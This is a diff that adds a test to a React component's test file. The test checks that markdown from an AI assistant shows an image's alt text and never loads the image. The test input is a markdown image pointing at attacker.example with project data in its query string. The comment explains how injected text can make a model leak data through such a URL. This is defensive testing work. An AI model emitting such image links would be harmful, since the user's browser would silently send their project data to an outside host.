@@ -20,4 +20,15 @@ describe('AssistantMarkdown', () => {
     expect(screen.getByText('click').getAttribute('href')).toBe('')
     expect(screen.getByRole('link', { name: 'docs' })).toHaveAttribute('rel', 'noopener noreferrer')
   })
+
+  it('shows the alt text instead of loading images from the model', () => {
+    // The browser requests an image URL as soon as an <img> is rendered, without a click. Text in the project can
+    // make the model put project data into such a URL, so an answer must never make the browser load one.
+    const { container } = render(
+      <AssistantMarkdown>{'Done. ![status](https://attacker.example/pixel.png?d=Headlamp%20ECU)'}</AssistantMarkdown>,
+    )
+
+    expect(container.querySelector('img')).toBeNull()
+    expect(container).toHaveTextContent('Done. status')
+  })
 })
